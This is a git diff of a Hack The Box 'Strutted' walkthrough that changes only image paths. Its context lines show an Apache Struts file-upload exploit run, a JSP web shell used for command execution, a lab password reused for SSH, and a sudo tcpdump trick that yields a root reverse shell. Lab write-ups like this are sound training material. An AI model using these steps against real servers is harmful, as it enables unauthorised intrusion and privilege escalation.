@@ -42,16 +42,16 @@ echo '10.10.11.59 strutted.htb' | sudo tee -a /etc/hosts
 ---
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325120029.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325120029.png)
 
 Let's try exploring the website, for example, we got a `Download` section, if we click it, it downloads this:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325120505.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325120505.png)
 
 We get a `.zip` file, let's view its contents:
 
-![](cybersecurity/images/Pasted%2520image%252020250325120629.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325120629.png)
 
 We got a lot of files, let's view the contents of `Dockerfile` for example:
 
@@ -85,21 +85,21 @@ CMD ["catalina.sh", "run"]
 
 Server is running `tomcat`, let's keep on investigating this, for example, if we go to `strutted`, we can find a file called `pom.xml`, this file contains the dependencies for the application, let's check it out:
 
-![](cybersecurity/images/Pasted%2520image%252020250325121543.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325121543.png)
 
 For example, this is running `apache struts`, specifically it is running `apache struts 6.3.0.1`, we got a `tomcat-users.xml` file, this reveals the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250325122403.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325122403.png)
 
 We got a plain text password, let's save it for now in case it helps somewhere else.
 
 Let's follow the string of the framework we found, let's try searching for a vulnerability regarding this:
 
-![](cybersecurity/images/Pasted%2520image%252020250325122545.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325122545.png)
 
 We got a File Upload vulnerability, let's read how the vulnerability works:
 
-![](cybersecurity/images/Pasted%2520image%252020250325122944.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325122944.png)
 
 
 We can find the PoC, let's check it out:
@@ -122,25 +122,25 @@ proxychains python3 S2-067.py -u http://strutted.htb --upload_endpoint /upload.a
 
 Now, let's start our proxy and check the request:
 
-![](cybersecurity/images/Pasted%2520image%252020250325124601.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325124601.png)
 
 On the reconnaissance, we were able to find the following source codes:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325124709.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325124709.png)
 
 This means we need to modify the request in the following way:
 
-![](cybersecurity/images/Pasted%2520image%252020250325124830.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325124830.png)
 
 Let's change the content type and the extension of the file, now, based on the code, we also need to change the magic bytes, let's do it:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325130106.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325130106.png)
 
 After changing this, we can see the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250325130141.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325130141.png)
 
 Once we've uploaded it, we can access the file with and test a basic RCE:
 
@@ -148,7 +148,7 @@ Once we've uploaded it, we can access the file with and test a basic RCE:
 http://strutted.htb/shell.jsp?action=cmd&cmd=id
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250325142213.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325142213.png)
 
 There we go, it worked, we can now send ourselves a shell, we need to do it in the following format:
 
@@ -189,7 +189,7 @@ http://strutted.htb/shell.jsp?action=cmd&cmd=/tmp/shell.sh
 
 If we check our listener, we can notice we got our connection:
 
-![](cybersecurity/images/Pasted%2520image%252020250325143143.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325143143.png)
 
 Let's begin privilege escalation.
 
@@ -207,16 +207,16 @@ First step would be stabilizing our shell:
 6. export TERM=xterm
 7. export BASH=bash
 
-![](cybersecurity/images/Pasted%2520image%252020250325143331.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325143331.png)
 
 Let's start by checking the users:
 
-![](cybersecurity/images/Pasted%2520image%252020250325144246.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325144246.png)
 
 We got an user with a shell: `james`, if we remember the `tomcat-users.xml` file, we got a password in it, let's check the file again:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325144416.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325144416.png)
 
 Let's test these credentials in ssh:
 
@@ -224,7 +224,7 @@ Let's test these credentials in ssh:
 james:IT14d6SSP81k
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250325144459.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325144459.png)
 
 They worked, let's read `user.txt`:
 
@@ -235,11 +235,11 @@ james@strutted:~$ cat user.txt
 
 Now, we can begin by checking our sudo privileges with `sudo -l`:
 
-![](cybersecurity/images/Pasted%2520image%252020250325144706.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325144706.png)
 
 We got sudo privileges on `/usr/sbin/tcpdump`, let's check it out on `gtfobins`:
 
-![](cybersecurity/images/Pasted%2520image%252020250325144813.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325144813.png)
 
 We can do the following to get a reverse shell as root:
 
@@ -254,11 +254,11 @@ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
 
 Now, let's start a new listener with the specified port, we'll see this:
 
-![](cybersecurity/images/Pasted%2520image%252020250325145323.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325145323.png)
 
 We got the root shell, let's read root flag:
 
-![](cybersecurity/images/Pasted%2520image%252020250325145422.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325145422.png)
 
 
 ```
@@ -267,7 +267,7 @@ root@strutted:/home/james# cat /root/root.txt
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250325145445.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250325145445.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/644
 
